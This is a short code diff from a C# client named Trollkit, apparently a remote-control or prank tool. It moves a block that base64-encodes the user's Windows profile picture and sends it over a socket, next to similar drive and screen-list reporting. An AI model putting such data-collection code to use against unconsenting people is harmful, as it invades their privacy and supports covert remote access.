@@ -73,19 +73,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			{
 				success = false;
 				BConsole.WriteLine("Drives error: " + e.Message, ConsoleColor.Red);
-			}
-
-			try
-			{
-				string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
-				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
-				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
-			}
-			catch (Exception e)
-			{
-				success = false;
-				BConsole.WriteLine("ProfilePicture error: " + e.Message, ConsoleColor.Red);
-			}
+			}		
 
 			try
 			{
@@ -133,6 +121,18 @@ namespace Trollkit_Client.Modules.CommandHandlers
 			{
 				success = false;
 				BConsole.WriteLine("ScreenList error: " + e.Message, ConsoleColor.Red);
+			}
+
+			try
+			{
+				string base64ProfilePicture = WindowsProfilePicture.Get448ImageString();
+				TransferCommandObject pfTransferObject = new TransferCommandObject { Command = "ProfilePicture", Value = base64ProfilePicture };
+				SendDataObjectToSocket(s, ClientServerPipeline.BufferSerialize(pfTransferObject));
+			}
+			catch (Exception e)
+			{
+				success = false;
+				BConsole.WriteLine("ProfilePicture error: " + e.Message, ConsoleColor.Red);
 			}
 
 			return success;
